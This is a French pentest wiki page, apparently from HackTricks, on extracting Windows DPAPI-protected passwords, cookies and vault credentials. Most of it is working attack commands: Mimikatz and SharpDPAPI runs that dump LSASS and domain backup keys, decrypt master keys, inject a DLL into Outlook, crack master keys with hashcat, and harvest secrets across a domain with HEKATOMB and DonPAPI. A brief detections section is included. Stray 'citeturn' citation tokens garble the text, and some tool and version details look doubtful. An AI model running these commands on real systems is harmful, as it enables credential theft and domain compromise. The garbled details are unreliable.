# DPAPI - Extraction de mots de passe

{{#include ../../banners/hacktricks-training.md}}



## Qu'est-ce que DPAPI

L'API de protection des données (DPAPI) est principalement utilisée dans le système d'exploitation Windows pour le **chiffrement symétrique des clés privées asymétriques**, en s'appuyant sur des secrets d'utilisateur ou de système comme source significative d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données à l'aide d'une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification de domaine du système, éliminant ainsi le besoin pour les développeurs de gérer eux-mêmes la protection de la clé de chiffrement.

La manière la plus courante d'utiliser DPAPI est via les fonctions **`CryptProtectData` et `CryptUnprotectData`**, qui permettent aux applications de chiffrer et de déchiffrer des données de manière sécurisée avec la session du processus actuellement connecté. Cela signifie que les données chiffrées ne peuvent être déchiffrées que par le même utilisateur ou système qui les a chiffrées.

De plus, ces fonctions acceptent également un **paramètre `entropy`** qui sera également utilisé lors du chiffrement et du déchiffrement, donc, pour déchiffrer quelque chose chiffré en utilisant ce paramètre, vous devez fournir la même valeur d'entropie qui a été utilisée lors du chiffrement.

### Génération de clé des utilisateurs

Le DPAPI génère une clé unique (appelée **`pre-key`**) pour chaque utilisateur en fonction de ses identifiants. Cette clé est dérivée du mot de passe de l'utilisateur et d'autres facteurs, et l'algorithme dépend du type d'utilisateur mais se termine par un SHA1. Par exemple, pour les utilisateurs de domaine, **cela dépend du hachage HTLM de l'utilisateur**.

C'est particulièrement intéressant car si un attaquant peut obtenir le hachage du mot de passe de l'utilisateur, il peut :

- **Déchiffrer toute donnée qui a été chiffrée en utilisant DPAPI** avec la clé de cet utilisateur sans avoir besoin de contacter une API
- Essayer de **craquer le mot de passe** hors ligne en essayant de générer la clé DPAPI valide

De plus, chaque fois qu'une donnée est chiffrée par un utilisateur utilisant DPAPI, une nouvelle **clé maître** est générée. Cette clé maître est celle réellement utilisée pour chiffrer les données. Chaque clé maître est fournie avec un **GUID** (Identifiant Unique Global) qui l'identifie.

Les clés maîtres sont stockées dans le répertoire **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, où `{SID}` est l'identifiant de sécurité de cet utilisateur. La clé maître est stockée chiffrée par le **`pre-key`** de l'utilisateur et également par une **clé de sauvegarde de domaine** pour la récupération (donc la même clé est stockée chiffrée 2 fois par 2 mots de passe différents).

Notez que la **clé de domaine utilisée pour chiffrer la clé maître se trouve dans les contrôleurs de domaine et ne change jamais**, donc si un attaquant a accès au contrôleur de domaine, il peut récupérer la clé de sauvegarde de domaine et déchiffrer les clés maîtres de tous les utilisateurs du domaine.

Les blobs chiffrés contiennent le **GUID de la clé maître** qui a été utilisée pour chiffrer les données à l'intérieur de ses en-têtes.

> [!TIP]
> Les blobs chiffrés par DPAPI commencent par **`01 00 00 00`**

Trouver des clés maîtres :
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Voici à quoi ressemble un ensemble de clés maîtresses d'un utilisateur :

![](<../../images/image (1121).png>)

### Génération de clés machine/système

C'est la clé utilisée par la machine pour chiffrer des données. Elle est basée sur le **DPAPI_SYSTEM LSA secret**, qui est une clé spéciale à laquelle seul l'utilisateur SYSTEM peut accéder. Cette clé est utilisée pour chiffrer des données qui doivent être accessibles par le système lui-même, telles que des identifiants au niveau de la machine ou des secrets à l'échelle du système.

Notez que ces clés **n'ont pas de sauvegarde de domaine**, elles ne sont donc accessibles qu'en local :

- **Mimikatz** peut y accéder en dumpant les secrets LSA avec la commande : `mimikatz lsadump::secrets`
- Le secret est stocké dans le registre, donc un administrateur pourrait **modifier les permissions DACL pour y accéder**. Le chemin du registre est : `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Données protégées par DPAPI

Parmi les données personnelles protégées par DPAPI, on trouve :

- Identifiants Windows
- Mots de passe et données de saisie automatique d'Internet Explorer et de Google Chrome
- Mots de passe des comptes e-mail et FTP internes pour des applications comme Outlook et Windows Mail
- Mots de passe pour les dossiers partagés, les ressources, les réseaux sans fil et Windows Vault, y compris les clés de chiffrement
- Mots de passe pour les connexions de bureau à distance, .NET Passport et clés privées pour divers objectifs de chiffrement et d'authentification
- Mots de passe réseau gérés par le Gestionnaire d'identifiants et données personnelles dans des applications utilisant CryptProtectData, telles que Skype, MSN Messenger, et plus
- Blobs chiffrés dans le registre
- ...

Les données protégées par le système incluent :
- Mots de passe Wifi
- Mots de passe de tâches planifiées
- ...

### Options d'extraction de clés maîtresses

- Si l'utilisateur a des privilèges d'administrateur de domaine, il peut accéder à la **clé de sauvegarde de domaine** pour déchiffrer toutes les clés maîtresses des utilisateurs dans le domaine :
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Avec des privilèges d'administrateur local, il est possible d'**accéder à la mémoire LSASS** pour extraire les clés maîtresses DPAPI de tous les utilisateurs connectés et la clé SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si l'utilisateur a des privilèges d'administrateur local, il peut accéder au **DPAPI_SYSTEM LSA secret** pour déchiffrer les clés maîtresses de la machine :
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si le mot de passe ou le hash NTLM de l'utilisateur est connu, vous pouvez **décrypter les clés maîtresses de l'utilisateur directement** :
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si vous êtes dans une session en tant qu'utilisateur, il est possible de demander au DC la **clé de sauvegarde pour déchiffrer les clés maîtresses en utilisant RPC**. Si vous êtes administrateur local et que l'utilisateur est connecté, vous pourriez **voler son jeton de session** pour cela :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Liste du coffre
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accéder aux données chiffrées DPAPI

### Trouver des données chiffrées DPAPI

Les **fichiers protégés** courants se trouvent dans :

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Vérifiez également en changeant `\Roaming\` en `\Local\` dans les chemins ci-dessus.

Exemples d'énumération :
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) peut trouver des blobs chiffrés DPAPI dans le système de fichiers, le registre et les blobs B64 :
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Notez que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (du même dépôt) peut être utilisé pour déchiffrer des données sensibles comme des cookies en utilisant DPAPI.

### Clés d'accès et données

- **Utilisez SharpDPAPI** pour obtenir des identifiants à partir de fichiers chiffrés par DPAPI de la session actuelle :
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtenez des informations d'identification** telles que les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Accéder aux masterkeys** :

Décryptez une masterkey d'un utilisateur en demandant la **clé de sauvegarde de domaine** via RPC :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement de la masterkey (notez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en texte clair, ou `/pvk` pour spécifier un fichier de clé privée de domaine DPAPI...) :
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Décrypter des données en utilisant une clé maître**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le décryptage de `credentials|vaults|rdg|keepass|triage|blob|ps` (notez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde des domaines, `/password` pour utiliser un mot de passe en texte clair, `/pvk` pour spécifier un fichier de clé privée de domaine DPAPI, `/unprotect` pour utiliser la session de l'utilisateur actuel...) :
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Décrypter des données en utilisant **la session utilisateur actuelle** :
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Gestion de l'entropie optionnelle ("Entropie tierce")

Certaines applications passent une valeur d'**entropie** supplémentaire à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être décrypté, même si la clé maître correcte est connue. Obtenir l'entropie est donc essentiel lors de la cible de credentials protégés de cette manière (par exemple, Microsoft Outlook, certains clients VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) est une DLL en mode utilisateur qui intercepte les fonctions DPAPI à l'intérieur du processus cible et enregistre de manière transparente toute entropie optionnelle qui est fournie. Exécuter EntropyCapture en mode **DLL-injection** contre des processus comme `outlook.exe` ou `vpnclient.exe` produira un fichier mappant chaque tampon d'entropie au processus appelant et au blob. L'entropie capturée peut ensuite être fournie à **SharpDPAPI** (`/entropy:`) ou **Mimikatz** (`/entropy:<file>`) afin de déchiffrer les données. citeturn5search0
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking des masterkeys hors ligne (Hashcat & DPAPISnoop)

Microsoft a introduit un format de masterkey **contexte 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (décembre 2023) a ajouté des modes de hachage **22100** (DPAPI masterkey v1 contexte), **22101** (contexte 1) et **22102** (contexte 3) permettant le craquage accéléré par GPU des mots de passe utilisateurs directement à partir du fichier masterkey. Les attaquants peuvent donc effectuer des attaques par liste de mots ou par force brute sans interagir avec le système cible. citeturn8search1

`DPAPISnoop` (2024) automatise le processus :
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
L'outil peut également analyser les blobs de Credential et de Vault, les déchiffrer avec des clés craquées et exporter des mots de passe en clair.


### Accéder aux données d'une autre machine

Dans **SharpDPAPI et SharpChrome**, vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr, vous devez être en mesure d'accéder à cette machine et dans l'exemple suivant, il est supposé que **la clé de chiffrement de sauvegarde de domaine est connue** :
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Autres outils

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs du répertoire LDAP et l'extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résoudra ensuite toutes les adresses IP des ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et déchiffrer le tout avec la clé de sauvegarde du domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraits de LDAP, vous pouvez trouver chaque sous-réseau même si vous ne les connaissiez pas !

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut extraire automatiquement des secrets protégés par DPAPI. La version 2.x a introduit :

* Collecte parallèle de blobs depuis des centaines d'hôtes
* Analyse des masterkeys de **contexte 3** et intégration automatique de Hashcat
* Support pour les cookies chiffrés "App-Bound" de Chrome (voir section suivante)
* Un nouveau mode **`--snapshot`** pour interroger de manière répétée les points de terminaison et différencier les blobs nouvellement créés citeturn1search2

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) est un parseur C# pour les fichiers masterkey/credential/vault qui peut produire des formats Hashcat/JtR et invoquer automatiquement le craquage en option. Il prend entièrement en charge les formats de masterkey machine et utilisateur jusqu'à Windows 11 24H1. citeturn2search0


## Détections courantes

- Accès aux fichiers dans `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` et d'autres répertoires liés à DPAPI.
- Surtout depuis un partage réseau comme **C$** ou **ADMIN$**.
- Utilisation de **Mimikatz**, **SharpDPAPI** ou d'outils similaires pour accéder à la mémoire LSASS ou extraire des masterkeys.
- Événement **4662** : *Une opération a été effectuée sur un objet* – peut être corrélé avec l'accès à l'objet **`BCKUPKEY`**.
- Événements **4673/4674** lorsqu'un processus demande *SeTrustedCredManAccessPrivilege* (Gestionnaire d'identifiants)

---
### Vulnérabilités 2023-2025 & changements d'écosystème

* **CVE-2023-36004 – Spoofing du canal sécurisé DPAPI de Windows** (novembre 2023). Un attaquant ayant accès au réseau pourrait tromper un membre de domaine pour récupérer une clé de sauvegarde DPAPI malveillante, permettant le déchiffrement des masterkeys utilisateur. Corrigé dans la mise à jour cumulative de novembre 2023 – les administrateurs doivent s'assurer que les DC et les stations de travail sont entièrement corrigés. citeturn4search0
* **Chiffrement des cookies "App-Bound" de Chrome 127** (juillet 2024) a remplacé la protection DPAPI uniquement héritée par une clé supplémentaire stockée sous le **Gestionnaire d'identifiants** de l'utilisateur. Le déchiffrement hors ligne des cookies nécessite désormais à la fois la masterkey DPAPI et la **clé app-bound enveloppée GCM**. SharpChrome v2.3 et DonPAPI 2.x peuvent récupérer la clé supplémentaire lorsqu'ils sont exécutés avec le contexte utilisateur. citeturn0search0


## Références

- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004
- https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
- https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/
- https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6
- https://github.com/Leftp/DPAPISnoop
- https://pypi.org/project/donpapi/2.0.0/

{{#include ../../banners/hacktricks-training.md}}
